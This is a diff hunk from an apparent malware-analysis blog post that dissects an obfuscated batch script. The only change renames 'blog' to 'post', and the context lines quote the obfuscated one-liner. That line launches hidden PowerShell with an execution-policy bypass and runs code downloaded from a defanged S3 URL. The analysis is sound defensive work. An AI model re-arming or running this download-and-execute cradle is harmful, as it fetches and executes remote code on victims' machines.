@@ -22,7 +22,7 @@ This is a fairly simple batch script which contains a lot of garbage Japanese st
 C^M^D.%rHX%X%rHX% /C P^OW%rHX%RSH%rHX%LL.%rHX%X%rHX% -N^O^P -WI^N^D HIDD%rHX%N -%rHX%X%rHX%C B^YPA^SS -NO^NI [BYT%rHX%[]];$vjpi='I%rHX%X(N%rHX%W-OBJ%rHX%CT N%rHX%T.W';$Jzzm='%rHX%BCLI%rHX%NT).DOWNLO';[BYT%rHX%[]];$AYeD='TUUL(''hxxps[://]buckotx.s3.amazonaws[.]com/x.png'')'.R%rHX%PLAC%rHX%('TUUL','ADSTRING');[BYT%rHX%[]];I%rHX%X($vjpi+$Jzzm+$AYeD)
 ```
 
-Similar to our method in the Analysing Obfuscated PowerShell Scripts blog, if we set the variable and add an "echo" to before the ommand line, we are able to deobfuscate the string.
+Similar to our method in the Analysing Obfuscated PowerShell Scripts post, if we set the variable and add an "echo" to before the ommand line, we are able to deobfuscate the string.
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/89a35c56-d8f2-488c-82e2-19d7491efdca)
 
